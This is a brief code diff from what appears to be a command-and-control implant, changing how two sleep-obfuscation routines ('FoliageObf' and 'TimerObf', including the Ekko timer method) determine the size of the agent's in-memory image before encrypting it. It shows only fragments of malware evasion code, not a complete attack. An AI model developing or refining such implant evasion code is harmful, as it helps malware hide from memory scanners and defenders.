@@ -65,7 +65,7 @@ VOID FoliageObf(
     SIZE_T              TmpValue    = 0;
 
     ImageBase = Instance.Session.ModuleBase;
-    ImageSize = IMAGE_SIZE( Instance.Session.ModuleBase );
+    ImageSize = Instance.Session.ModuleSize;
 
     // Generate random keys
     for ( SHORT i = 0; i < 16; i++ )
@@ -382,7 +382,7 @@ BOOL TimerObf(
 
     /* set agent memory pointer and size */
     Img.Buffer = ImgBase           = Instance.Session.ModuleBase;
-    Img.Length = Img.MaximumLength = ImgSize = IMAGE_SIZE( Instance.Session.ModuleBase );
+    Img.Length = Img.MaximumLength = ImgSize = Instance.Session.ModuleSize;
 
     if ( Method == SLEEPOBF_EKKO ) {
         NtStatus = Instance.Win32.RtlCreateTimerQueue( &Queue );
